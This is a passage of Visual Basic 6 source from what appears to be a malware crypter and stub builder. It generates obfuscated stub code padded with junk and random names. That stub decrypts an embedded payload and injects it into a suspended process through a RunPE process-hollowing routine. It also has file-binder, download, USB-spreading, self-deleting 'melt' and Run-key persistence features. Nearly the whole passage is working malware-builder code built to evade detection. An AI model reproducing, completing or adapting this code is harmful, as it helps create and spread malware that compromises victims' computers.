        
        a = a + "loop" + vbCrLf
        a = a + "end sub " + vbCrLf
        
    M_Delay = a
        
End With

End Function


Private Function M_SubMain()

With Form1

DoEvents

'Sub Main [Part of Module Begin]

    Dim a As String
    
        a = a + "Sub Main()" + vbCrLf + vbCrLf
        a = a + TxtSub(8) + "(1)" + vbCrLf
        a = a + Trash2 + S1

        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + TxtSub(8) + "(.8)" + vbCrLf
        If Check9.Value = 1 Then a = a + Trash3 + S1
        a = a + "call " + TxtSub(2) + vbCrLf
        a = a + "End Sub" + vbCrLf

    M_SubMain = a


End With
    
End Function

Private Function M_MainChunk()

With Form1

DoEvents

    Dim a As String

        a = a + "private sub " + TxtSub(2) + "()" + vbCrLf
        a = a + "On Error Resume Next" + vbCrLf
        
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        
        a = a + "dim " + Dec(25).Text + " as integer" + vbCrLf
        
        If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
        
        a = a + Dec(25).Text & " = FreeFile" + vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        If Check9.Value = 1 Then
        If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 + S1
        End If
        
        a = a + "Open " + App_Path + " For Binary As #" + Dec(25).Text & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + Dec(0).Text + " = String(lof(" + Dec(25).Text + "), vbnullchar)" & vbCrLf
        a = a + "Get #" + Dec(25).Text + ",, " + Dec(0).Text & vbCrLf
        a = a + "Close #" + Dec(25).Text & vbCrLf & vbCrLf
        
        If Check21.Value = 1 Then a = a + Trash2 + S1
        If Check9.Value = 2 Then a = a + Trash3 + S1
        
        a = a + "Call " + Dec(1).Text + vbCrLf
        a = a + ApiNames(2) + " (" + Dec(4) + ")" + vbCrLf
        a = a + Dec(13).Text + "() = Split(" + Dec(0).Text + "," + Cst(2).Text + ")" + vbCrLf
        a = a + "if " + Dec(14).Text + "(0) = ""2"" then msgbox " + Dec(14).Text + "(2)," + Dec(14).Text + "(23) + " + _
                Dec(22).Text + "," + Dec(14).Text + "(1)" & vbCrLf
        
        If Check9.Value = 1 And ComboBox1(2).ListIndex = 2 Then a = a + Trash4 + S1
        
        Sleep (500)
        
        a = a & "if " & Dec(14).Text & "(39) = ""0"" then" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + Dec(13).Text + "(1) =" + TxtFunc(9).Text + "(" + Dec(13).Text + "(1)" + "," + Dec(2).Text + ")" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a & "else " & vbCrLf
        Sleep (500)
        a = a + Dec(13).Text + "(1) =" + XorName + "(" + Dec(13).Text + "(1)" + "," + Dec(14).Text & "(69)" & ")" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a & "end if " & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if " + Dec(3).Text + " = ""1"" then " + Dec(3).Text + " = " + TxtFunc(0).Text + vbCrLf + _
                "if " + Dec(3).Text + " = vbnullstring then " + Dec(3).Text + " = " & TxtFunc(13) + vbCrLf
        
        If Check21.Value = 1 Then a = a + Trash2 + S1
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "Call " + Dec(20).Text + "." + TxtSub(1).Text + "(" + Dec(3).Text + ", strconv(" + Dec(13).Text + "(1)" + ", vbfromunicode))" + vbCrLf
        a = a + "If " + Dec(14) + "(0) = ""1"" Then " + ApiNames(2) + "  (30000): MsgBox " + Dec(14) + "(2)" + "," + Dec(14) + "(23)" + "+" + Dec(22) + "," + Dec(14) + "(1)" + vbCrLf
        
'Include Binder's Code
If Check15.Value = 1 Then
        
        a = a + "'###################################################################################################################################################################################" + vbCrLf + vbCrLf + vbCrLf
        a = a + "'-------------------------------------------------  BINDER'S CODE BELOW ------------------------------------------------------------------------------------------------------------" & vbCrLf
        a = a + "'###################################################################################################################################################################################" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + Dec(15).Text + "() = Split(" + Dec(0).Text + "," + Cst(3).Text + ")" + vbCrLf
        a = a + "DoEvents" + vbCrLf
        
        If Check21.Value = 1 Then
        If ComboBox1(6).ListIndex >= 1 Then a = a + Trash2 + S1
        End If
        
        a = a + "For " + Dec(23).Text + " = 1 to ubound(" + Dec(15).Text + "()) - 1" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + Dec(16).Text + "() = split(" + Dec(0).Text + "," + Cst(4) + ")" + vbCrLf
        
        Sleep (500)
        
       If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
       
       If Check11.Value = 1 Then
       If ComboBox1(3).ListIndex >= 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
       End If
       
        a = a + Dec(17).Text + " = split(" + Dec(16) + "(" + Dec(23).Text + ")," + Cst(5).Text + ")" + vbCrLf
       
       If Check11.Value = 1 Then
       If ComboBox1(3).ListIndex = 2 Then a = a + Trash7(ComboBox1(3).ListIndex + 1) & vbCrLf
       End If
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + Dec(5).Text + " = " + Dec(15).Text + "(1)" + vbCrLf
        a = a + Dec(6).Text + " = " + Dec(17).Text + "(0)" + vbCrLf
                
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + Dec(7).Text + " = " + Dec(17).Text + "(1)" + vbCrLf
        a = a + Dec(8).Text + " = " + Dec(17).Text + "(2)" + vbCrLf

        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + Dec(9).Text + " = " + Dec(17).Text + "(3)" + vbCrLf
        a = a + "call " + TxtSub(3) & vbCrLf & vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
                
        a = a + "if " + Dec(9).Text + " = ""1"" then " + Dec(15).Text + "(1) = " + TxtFunc(9) + "(" + Dec(15) + "(1)," + Dec(2).Text + ")" + vbCrLf
        a = a + "Doevents" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if " + TxtSub(4).Text + "(" + Dec(6).Text + " & ""\"" & " + Dec(8).Text + ") then kill " + Dec(6).Text + " & ""\"" &  " + Dec(8).Text + vbCrLf
       Sleep (500)
        a = a + "open " + Dec(6).Text + " & ""\"" &  " + Dec(8).Text + " For binary as #1" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "put #1, , " + Dec(15) + "(1)" + vbCrLf
        a = a + "close #1" + vbCrLf + vbCrLf + vbCrLf
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + " if " + Dec(7) + " = 1 then call " + ApiNames(1) + " (hwnd, ""open""," + Dec(6) + " & ""\"" & " + Dec(8) + ", 0,0,1)" + vbCrLf
        a = a + " if " + Dec(7) + " = 2 then call " + ApiNames(1) + " (hwnd, ""open""," + Dec(6) + " & ""\"" & " + Dec(8) + ", 0,0,0)" + vbCrLf
        
       If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + " if " + Dec(7) + " = 4 then Call " + Dec(20).Text + "." + TxtSub(1).Text + "(" + Dec(3).Text + ", strconv(" + Dec(15) + "(1), vbfromunicode))" + vbCrLf
        a = a + "Next " + Dec(23) + vbCrLf + vbCrLf
        
End If

'Stealth Options
If Check26.Value = 1 Then
        a = a + "'Download File" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "If " + Dec(14) + "(27) = ""1"" Then Call " + TxtSub(5) + "(23)" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "'Usb Spread" + vbCrLf
        a = a + "If " + Dec(14) + "(28) = ""1"" Then Call " + TxtSub(5) + "(24)" + vbCrLf
End If
        
      Sleep (500)
        
        If Check9.Value = 1 Then a = a + Trash3 + S1
        
        a = a + "'Melt File " + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "If " + Dec(10) + " = ""1"" Then Call " + TxtSub(7) + vbCrLf
        a = a + "'Load Custom Url" + vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "If " + Dec(14) + "(37) = ""1"" Then shell ""cmd /c start "" & " + Dec(14) + "(38),vbhide" + vbCrLf
        a = a & "If " & Dec(14) & "(66) = 1 Then" & vbCrLf
        a = a & "While " & TxtFunc(11) & "(App.EXEName & "".exe"")" & vbCrLf
        a = a & "DoEvents" & vbCrLf
        a = a & "if " & TxtFunc(12) & "(""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\""," & TxtFunc(13) & ") = """" Then" & vbCrLf
        a = a & "Call " & TxtFunc(10) & "(" & Dec(14) & "(67)," & TxtFunc(13) & ")" & vbCrLf
        a = a & "End If" & vbCrLf & "Wend" & vbCrLf & "end if" & vbCrLf & vbCrLf
        
        a = a + "End sub" + vbCrLf
        a = a + "public function " + TxtSub(4) + "(fname) as boolean" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "if dir(fname) <> """" then" & vbCrLf + TxtSub(4) + " = true" & vbCrLf
        If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
        a = a + "Else: " + TxtSub(4) + " = false" & ":End If" & vbCrLf + " End function " & vbCrLf
        
Dim appvar1 As String
RndStrings appvar1

        a = a & "public Function " & TxtFunc(13) & "() As String " & vbCrLf
        a = a & "Dim " & appvar1 & " as String" & vbCrLf
        a = a & appvar1 & " = " & "app.Path & ""\"" & app.exename & "".exe""" & vbCrLf
        a = a & TxtFunc(13) & " = " & appvar1 & vbCrLf & "End Function " & vbCrLf & vbCrLf
        
M_MainChunk = a

End With

End Function

Public Function M_Runpe()

Randomize

DoEvents

    Dim a As String
    
    Dim Pe_Var1 As String
    Dim Pe_Var2 As String
    Dim Pe_Var3 As String
    Dim Pe_Var4 As String
    Dim Pe_Var5 As String
    Dim Pe_Var6 As String
    Dim Pe_Var7 As String
    Dim Pe_Var8 As String
    Dim Pe_Var9 As String
    Dim Pe_Var10 As String
    Dim Pe_Var11 As String
    Dim Pe_Var12 As String
    Dim Pe_Var13 As String
    Dim Pe_Var14 As String
    Dim Pe_var15 As String
    Dim Pe_var16 As String
    Dim Pe_var17 As String
    
    RndStrings Pe_Var1
    RndStrings Pe_Var2
    RndStrings Pe_Var3
    RndStrings Pe_Var4
    RndStrings Pe_Var5
    RndStrings Pe_Var6
    RndStrings Pe_Var7
    RndStrings Pe_Var8
    RndStrings Pe_Var9
    RndStrings Pe_Var10
    RndStrings Pe_Var11
    RndStrings Pe_Var12
    RndStrings Pe_Var13
    RndStrings Pe_Var14
    RndStrings Pe_var15
    RndStrings Pe_var16
    RndStrings Pe_var17


a = "VERSION 1.0 CLASS " & vbCrLf
a = a + "Begin " & vbCrLf
a = a + "Multiuse = -1 " & vbCrLf
a = a + "Persistable = 0 " & vbCrLf
a = a + " DataBindingBehavior = 0 " & vbCrLf
a = a + "DataSourceBehavior = 0 " & vbCrLf
a = a + " MTSTransactionMode = 0 " & vbCrLf
a = a + "End " & vbCrLf
a = a + "Attribute VB_Name = " + TxtSub(4).Text & vbCrLf
a = a + "Attribute VB_GlobalNameSpace = False " & vbCrLf
a = a + "Attribute VB_Creatable = True" & vbCrLf
a = a + "Attribute VB_PredeclaredId = False " & vbCrLf
a = a + "Attribute VB_Exposed = False " & vbCrLf & vbCrLf

Randomize

If Check7.Value = 1 Then a = a + GenSub(ComboBox1(0).ListIndex) & vbCrLf
If Check8.Value = 1 Then a = a + GenFunction(ComboBox1(1).ListIndex + 1) & vbCrLf

    a = a + "Public Function " + TxtFunc(3) + "(ByVal " + Pe_Var1 + " as string, byval " + Pe_Var2 + " as string, ParamArray " + Pe_Var3 + " ()) as long " & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "Dim " + Pe_Var4 + "   as Long" & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "dim " + Pe_Var5 + "(&HEC00& - 1)   as byte" & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "Dim " + Pe_Var6 + " as long " & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + Pe_Var4 + " = VarPtr(" + Pe_Var5 + "(0))" & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "CopyBytes &H4, Byval " + Pe_Var4 + ",&H59595958: " + Pe_Var4 + " = " + Pe_Var4 + " + 4" & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "CopyBytes &H2, Byval " + Pe_Var4 + ",&H5059: " + Pe_Var4 + " = " + Pe_Var4 + " + 2 " & vbCrLf & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "For " + Pe_Var6 + " = ubound(" + Pe_Var3 + ") to 0 step - 1 " & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "CopyBytes &H1, ByVal " + Pe_Var4 + ", &H68: " + Pe_Var4 + " = " + Pe_Var4 + " + 1" & vbCrLf
    a = a & Trash3 & vbCrLf
    a = a + "CopyBytes &H4, ByVal " + Pe_Var4 + ", CLng(" + Pe_Var3 + "(" + Pe_Var6 + ")):" + Pe_Var4 + " = " + Pe_Var4 + " + 4" & vbCrLf
    a = a + "next " & vbCrLf & vbCrLf

a = a & Trash3 & vbCrLf
a = a + "CopyBytes &H1, ByVal " + Pe_Var4 + ", &HE8: " + Pe_Var4 + " = " + Pe_Var4 + " + 1" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + "CopyBytes &H4, ByVal " + Pe_Var4 + ", GetProcAddress(LoadLibraryA(" + Pe_Var1 + ")," + Pe_Var2 + ") - " + Pe_Var4 + " - 4:" + Pe_Var4 + " = " + Pe_Var4 + "+ 4" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + "CopyBytes &H1, ByVal " + Pe_Var4 + ", &HC3: " + Pe_Var4 + " = " + Pe_Var4 + " + 1" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + TxtFunc(3) + " = CallWindowProcA(VarPtr(" + Pe_Var5 + "(0)),0,0,0,0) " & vbCrLf
a = a + "end function" & vbCrLf & vbCrLf & vbCrLf

If Check8.Value = 1 Then
If ComboBox1(1).ListIndex >= 1 Then GenFunction (ComboBox1(1).ListIndex + 1) & vbCrLf
End If

If Check7.Value = 1 Then
If ComboBox1(0).ListIndex >= 1 Then GenFunction (ComboBox1(0).ListIndex + 1) & vbCrLf
End If

' =================================================================================================================================================================================================================================
'                                            ' Code for the RunPe below
' =================================================================================================================================================================================================================================

Sleep (500)

DoEvents

a = a + "' Runpe Sub [INJECT INTO MEMORY]" & vbCrLf & vbCrLf
a = a + "Sub " + TxtSub(1) + "(" + Pe_Var8 + " as string," + Pe_Var9 + "() as byte)" & vbCrLf

If Check11.Value = 1 Then a = a + Trash7(ComboBox1(3).ListIndex + 1)

a = a + "Dim " + Pe_var15 + " as swhiujk34redre" & vbCrLf
a = a + "Dim " + Pe_Var10 + " as jds4" & vbCrLf

Sleep (500)
a = a + Trash7(ComboBox1(3).ListIndex + 1)

a = a + "dim " + Pe_Var11 + " as raSDOAIjweor23j9wDji" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + "dim " + Pe_Var12 + " as fiauhj35qhiwurjn4wer" & vbCrLf

If Check11.Value = 1 Then
If ComboBox1(3).ListIndex <> 0 Then a = a + Trash7(ComboBox1(3).ListIndex + 1)
End If

a = a + "dim " + Pe_Var13 + " as fhiuqj34krw" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + "dim " + Pe_Var14 + " as mnwui2qj4wr" & vbCrLf

If Check11.Value = 1 Then
If ComboBox1(3).ListIndex <> 0 Then a = a + Trash7(ComboBox1(3).ListIndex + 1)
End If

a = a + Trash3 & vbCrLf

a = a + Trash1 & vbCrLf

a = a + Pe_Var12 + ".cb = len(" + Pe_Var12 + ")" & vbCrLf

Sleep (500)

a = a + Trash3 & vbCrLf

a = a + Trash5 & vbCrLf

a = a + Pe_Var14 + "." + RT20 + " = &H10007" & vbCrLf & vbCrLf

a = a + "call " + TxtFunc(3) + "(""kernel32"",""RtlMoveMemory"", VarPtr(" + Pe_var15 + "), VarPtr(" + Pe_Var9 + "(0)), Len(" + Pe_var15 + "))" & vbCrLf

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 & vbCrLf
End If

a = a + "call " + TxtFunc(3) + "(""kernel32"",""RtlMoveMemory"", VarPtr(" + Pe_Var10 + "), VarPtr(" + Pe_Var9 + "(" + Pe_var15 + "." + RT1 + ")), Len(" + Pe_Var10 + "))" & vbCrLf

a = a + Trash3 & vbCrLf

If Check20.Value = 1 Then
If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 & vbCrLf
End If

a = a + "call " + TxtFunc(3) + "(""kernel32"",""CreateProcessW"", 0,strptr(" + Pe_Var8 + "),0,0,0, &H4,0,0,Varptr(" + Pe_Var12 + "),Varptr(" + Pe_Var13 + "))" & vbCrLf

a = a + Trash5 & vbCrLf

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 & vbCrLf
End If

Sleep (500)

a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtUnmapViewOfSection""," + Pe_Var13 + "." + RT2 + "," + Pe_Var10 + "." + RT3 + "." + RT4 + ")" & vbCrLf

a = a + Trash2 & vbCrLf

If Check21.Value = 1 Then
If ComboBox1(6).ListIndex = 2 Then a = a + Trash5 & vbCrLf
End If

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 2 Then a = a + Trash3 & vbCrLf
End If

a = a + Trash1 & vbCrLf

a = a + "call " + TxtFunc(3) + "(""kernel32"",""VirtualAllocEx""," + Pe_Var13 + "." + RT2 + "," + Pe_Var10 + "." + RT3 + "." + RT4 + "," + Pe_Var10 + "." + RT3 + "." + RT11 + ", &H1000 Or &H2000, &H40)" & vbCrLf
a = a & Trash3 & vbCrLf
a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtWriteVirtualMemory""," + Pe_Var13 + "." + RT2 + "," + Pe_Var10 + "." + RT3 + "." + RT4 + ", VarPtr(" + Pe_Var9 + "(0)), " + Pe_Var10 + "." + RT3 + "." + RT5 + " ,0)" & vbCrLf & vbCrLf

Dim mVarI As String
RndStrings mVarI

a = a + "for " + mVarI + " = 0 to " + Pe_Var10 + "." + RT14 + "." + RT13 + " - 1 " & vbCrLf
a = a + vbCr + "call Cpymem(" + Pe_Var11 + "," + Pe_Var9 + "(" + Pe_var15 + "." + RT1 + " + len(" + Pe_Var10 + ") + len(" + Pe_Var11 + ") * " + mVarI + "), len(" + Pe_Var11 + "))" & vbCrLf
a = a + vbCr + "call " + TxtFunc(3) + "(""ntdll"",""NtWriteVirtualMemory""," + Pe_Var13 + "." + RT2 + "," + Pe_Var10 + "." + RT3 + "." + RT4 + " + " + Pe_Var11 + ".va, varptr(" + Pe_Var9 + "(" + Pe_Var11 + "." + RT6 + ")), " + Pe_Var11 + "." + RT7 + ",0)" & vbCrLf
a = a + " Next " & vbCrLf & vbCrLf

If Check21.Value = 1 Then
If ComboBox1(6).ListIndex >= 1 Then a = a + Trash5 & vbCrLf
End If

If Check20.Value = 1 Then
If ComboBox1(5).ListIndex = 2 Then a = a + Trash1 & vbCrLf
End If

a = a & Trash3 & vbCrLf
a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtGetContextThread""," + Pe_Var13 + "." + RT10 + ", VarPtr(" + Pe_Var14 + "))" & vbCrLf
a = a & Trash3 & vbCrLf
a = a & Trash3 & vbCrLf
If Check20.Value = 1 Then
If ComboBox1(5).ListIndex = 2 Then a = a + Trash1 & vbCrLf
End If

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 2 Then a = a + Trash3 & vbCrLf
End If

a = a + Trash4 & vbCrLf

Sleep (500)

a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtWriteVirtualMemory""," + Pe_Var13 + "." + RT2 + "," + Pe_Var14 + "." + RT8 + " + 8, VarPtr(" + Pe_Var10 + "." + RT3 + "." + RT4 + "),4,0)" & vbCrLf
a = a & Trash3 & vbCrLf
If Check9.Value = 1 Then
a = a + Trash3 & vbCrLf
End If

If Check21.Value = 1 Then
a = a + Trash5 & vbCrLf
End If

If Check20.Value = 1 Then
If ComboBox1(5).ListIndex >= 1 Then a = a + Trash1 & vbCrLf
End If
a = a & Trash3 & vbCrLf
a = a + Pe_Var14 + "." + RT12 + " = " + Pe_Var10 + "." + RT3 + "." + RT4 + " + " + Pe_Var10 + "." + RT3 + "." + RT9 + "" & vbCrLf

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 1 Then a = a + Trash3 & vbCrLf
End If

a = a & Trash3 & vbCrLf
a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtSetContextThread""," + Pe_Var13 + "." + RT10 + "," + " VarPtr(" + Pe_Var14 + "))" & vbCrLf

If Check20.Value = 1 Then
If ComboBox1(5).ListIndex = 2 Then a = a + Trash1 & vbCrLf
End If

a = a + Trash2 & vbCrLf

If Check9.Value = 1 Then
If ComboBox1(2).ListIndex >= 2 Then a = a + Trash3 & vbCrLf
End If

If Check21.Value = 1 Then
If ComboBox1(6).ListIndex >= 1 Then a = a + Trash5 & vbCrLf
End If

a = a + "call " + TxtFunc(3) + "(""ntdll"",""NtResumeThread""," + Pe_Var13 + "." + RT10 + " ,0)" & vbCrLf & vbCrLf

If Check20.Value = 1 Then
If ComboBox1(5).ListIndex = 2 Then a = a + Trash1 & vbCrLf
End If

If Check21.Value = 1 Then
If ComboBox1(6).ListIndex = 2 Then a = a + Trash5 & vbCrLf
End If
a = a & Trash3 & vbCrLf
a = a + Trash3 & vbCrLf

Sleep (500)

a = a + "end sub " & vbCrLf & vbCrLf

M_Runpe = a

   
End Function

Public Function M_Begin() As String

'Module Begin [Main Module]

'On Error Resume Next


DoEvents

    Dim a As String
 

        a = "Attribute VB_Name = " & """" + GenNumKey(15) + """" + vbCrLf
 
        If Check8.Value = 1 Then a = a + GenFunction(ComboBox1(1).ListIndex + 1) & vbCrLf

        If Check7.Value = 1 Then a = a + GenSub(ComboBox1(0).ListIndex + 1) & vbCrLf

        If Check7.Value = 1 Then
        
        PB.Value = 13
        PB.Text = "     " & "Generating Code [Main Module]..." & " " & PB.Value & "%"
        
        If ComboBox1(0).ListIndex >= 1 Then a = a + GenSub(ComboBox1(0).ListIndex + 1) & vbCrLf
        End If
        
        a = a + M_Delay
                
        If Check8.Value = 1 Then
        If ComboBox1(1).ListIndex >= 1 Then a = a + GenFunction(ComboBox1(1).ListIndex + 1) & vbCrLf
        End If
        
        PB.Value = 19
        PB.Text = "     " & "Generating Code [Main Module]..." & " " & PB.Value & "%"
        
        Sleep (500)

        a = a + M_SubMain
        
                
DoEvents
        
        If Check8.Value = 1 Then
        If ComboBox1(1).ListIndex = 2 Then a = a + GenFunction(ComboBox1(1).ListIndex + 1) & vbCrLf
        End If
                
        a = a + M_MainChunk
               
        PB.Value = 26
        PB.Text = "     " & "Generating Code [Startup Feature]..." & " " & PB.Value & "%"
                
        If Check7.Value = 1 Then
        If ComboBox1(0).ListIndex >= 1 Then a = a + GenSub(ComboBox1(0).ListIndex) & vbCrLf
        End If
        
        PB.Value = 33
        PB.Text = "     " & "Generating Code [File Binder]..." & " " & PB.Value & "%"
        
        Sleep (500)
        
        If Check15.Value = 1 Then

        a = a + m_BinderVars
        
        End If
        
        a = a + F_XP

        a = a + T_OsVersionInfo
        
        PB.Value = 40
        PB.Text = "     " & "Generating Code [File Binder]..." & " " & PB.Value & "%"
        
        Sleep (500)
        
        If Check7.Value = 1 Then
        If ComboBox1(0).ListIndex = 2 Then a = a + GenSub(ComboBox1(0).ListIndex) & vbCrLf
        End If
        
        a = a + M_melt
        
        a = a + M_ReadSettings
        
        a = a + m_Registry
        
        PB.Value = 52
        PB.Text = "     " & "Reading Code [Settings]..." & " " & PB.Value & "%"
        
        If Check8.Value = 1 Then a = a + GenFunction(ComboBox1(1).ListIndex + 1) & vbCrLf
        
Sleep (500)
        
        a = a + f_Browser
         
a = a + MakeXor
If ComboBox1(8).ListIndex = 1 Then a = a + MakeRotX
If ComboBox1(7).ListIndex = 1 Then a = a + MakeStrHex

        PB.Value = 59
        PB.Text = "     " & "Generating Code [Creating Algorithms]..." & " " & PB.Value & "%"

M_Begin = a

End Function

Private Function m_Registry()

Dim G As String

Dim IprVar1 As String, IprVar2 As String, IprVar3 As String, IprVar4 As String, IprVar5 As String, IprVar6 As String, IprVar7 As String
Dim IprVar8 As String, IprVar9 As String, IprVar10 As String

RndStrings IprVar1
RndStrings IprVar2
RndStrings IprVar3
RndStrings IprVar4
RndStrings IprVar5
RndStrings IprVar6
RndStrings IprVar7
RndStrings IprVar8
RndStrings IprVar9
RndStrings IprVar10

G = G & "public Function " & TxtFunc(11) & "(Byval " & IprVar1 & " as string) as boolean " & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "   " & "Const " & IprVar2 & " as long = 260" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "   " & "Dim " & IprVar3 & "() as long, " & IprVar4 & "() as long, " & IprVar5 & " as long, " & IprVar6 & " as long, " & IprVar7 & " as long " & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "   " & "Dim " & IprVar8 & " as string " & vbCrLf

G = G & "   " & IprVar1 & " = UCase$(" & IprVar1 & ")" & vbCrLf

G = G & "   " & "Redim " & IprVar3 & "(1023) as long" & vbCrLf
G = G & "   " & "If EnumProcesses(" & IprVar3 & "(0), 1024 * 4, " & IprVar6 & ") then " & vbCrLf
G = G & "       " & "For " & IprVar5 & " = 0 to (" & IprVar6 & " \ 4) - 1 " & vbCrLf
G = G & "           " & IprVar7 & " = OpenProcess(" & P_Q_I & " Or " & P_V_R & ", 0, " & IprVar3 & "(" & IprVar5 & "))" & vbCrLf
G = G & "           " & "if " & IprVar7 & " then " & vbCrLf

If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "               " & "Redim " & IprVar4 & "(1023) " & vbCrLf
G = G & "               " & "If EnumProcessModules(" & IprVar7 & "," & IprVar4 & "(0), 1024 * 4," & IprVar6 & ") then" & vbCrLf

If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "               " & IprVar8 & " = String$(" & IprVar2 & ", VbNullChar) " & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "               " & "GetModuleBaseName " & IprVar7 & "," & IprVar4 & "(0), " & IprVar8 & "," & IprVar2 & vbCrLf

G = G & "               " & IprVar8 & " = Left$(" & IprVar8 & ", InStr(" & IprVar8 & ", vbNullChar) - 1)" & vbCrLf
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "               " & "If Len(" & IprVar8 & ") = Len(" & IprVar1 & ") Then" & vbCrLf

G = G & "                   " & "If " & IprVar1 & " = Ucase$(" & IprVar8 & ") then " & TxtFunc(11) & " = True: Exit Function " & vbCrLf
G = G & "           " & "End If " & vbCrLf & "      " & "End if " & vbCrLf & "  " & "end if " & vbCrLf & "  " & "CloseHandle " & IprVar7 & vbCrLf
G = G & "   " & "Next " & IprVar5 & vbCrLf & "End if " & vbCrLf & "End Function " & vbCrLf & vbCrLf

' ================================================================================================================================================================

Dim RR1 As String, RR2 As String, RR3 As String, RR4 As String, RR5 As String

RndStrings RR1
RndStrings RR2
RndStrings RR3
RndStrings RR4
RndStrings RR5

G = G & "Public Function " & TxtFunc(12) & "(" & RR1 & "," & RR2 & ") As Variant" & vbCrLf
    
G = G & "    On Error Resume Next" & vbCrLf
    
If Check9.Value = 1 Then
        For X = 1 To ComboBox1(2).ListIndex + 1
        a = a & Trash3 & vbCrLf
        Next X
        End If
G = G & "    Dim " & RR3 & " as Object" & vbCrLf
If Check9.Value = 1 Then
